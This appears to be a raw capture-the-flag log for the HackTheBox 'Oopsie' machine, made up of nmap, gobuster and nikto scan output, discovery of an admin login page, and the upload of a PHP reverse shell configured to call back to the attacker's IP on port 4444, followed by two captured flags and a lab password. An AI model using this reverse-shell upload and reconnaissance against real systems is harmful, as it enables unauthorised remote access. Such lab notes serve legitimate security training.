HACKTHEBOX -oopsie

===========================================
ing -c 1 10.129.48.192 
PING 10.129.48.192 (10.129.48.192) 56(84) bytes of data.
64 bytes from 10.129.48.192: icmp_seq=1 ttl=63 time=89.8 ms

--- 10.129.48.192 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 89.838/89.838/89.838/0.000 ms


=========================================
nmap -sC -sV -A -p- --min-rate=1000 -T4 10.129.48.192
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-15 21:19 EDT
Nmap scan report for 10.129.48.192
Host is up (0.10s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=4/15%OT=22%CT=1%CU=44242%PV=Y%DS=2%DC=T%G=Y%TM=625A19F
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=FF%GCD=1%ISR=10F%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=
OS:M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=FE
OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   105.32 ms 10.10.14.1
2   98.61 ms  10.129.48.192

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.49 seconds

============================================================

gobuster dir -u http://10.129.48.192/ -w /usr/share/wordlists/dirb/common.txt      
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.48.192/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/15 21:24:02 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.129.48.192/css/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.48.192/fonts/]
/images               (Status: 301) [Size: 315] [--> http://10.129.48.192/images/]
/index.php            (Status: 200) [Size: 10932]                                 
/js                   (Status: 301) [Size: 311] [--> http://10.129.48.192/js/]    
/server-status        (Status: 403) [Size: 278]                                   
/themes               (Status: 301) [Size: 315] [--> http://10.129.48.192/themes/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.48.192/uploads/]
                                                                                   
===============================================================
2022/04/15 21:24:58 Finished
===============================================================

===============================================================
curl -X OPTIONS -I http://10.129.48.192/uploads/
HTTP/1.1 200 OK
Date: Sat, 16 Apr 2022 01:26:00 GMT
Server: Apache/2.4.29 (Ubuntu)
Allow: OPTIONS,HEAD,GET,POST
Content-Length: 0
Content-Type: httpd/unix-directory


==============================================================
nikto -host 10.129.64.185                                                                                                                                                                                                     148 â¨¯ 1 âš™
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.64.185
+ Target Hostname:    10.129.64.185
+ Target Port:        80
+ Start Time:         2022-04-15 17:08:38 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-10944: : CGI Directory found
+ OSVDB-10944: /cdn-cgi/login/: CGI Directory found

================================================================================

http://10.129.48.192/cdn-cgi/login/

http://10.129.48.192/cdn-cgi/login/admin.php

================================================================================

(rootðŸ’€kali)-[/home/kali/HackTheBox/Oopsie]
â””â”€# cp  /usr/share/webshells/php/php-reverse-shell.php ./                                                                                                                                                147 â¨¯ 3 âš™
                                                                                                                                                                                                                   
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HackTheBox/Oopsie]
â””â”€# nano php-reverse-shell.php  

=====================================================================
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.142';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
====================================================================

Repair Management System


The file php-reverse-shell.php has been uploaded.

====================================================================
HTB{f2c74ee8db7983851ab2a96a44eb7981}

robert M3g4C0rpUs3r!

==============================================================
HTB{af13b0bee69f8a877c3faf667f7beacf}
==============================================================
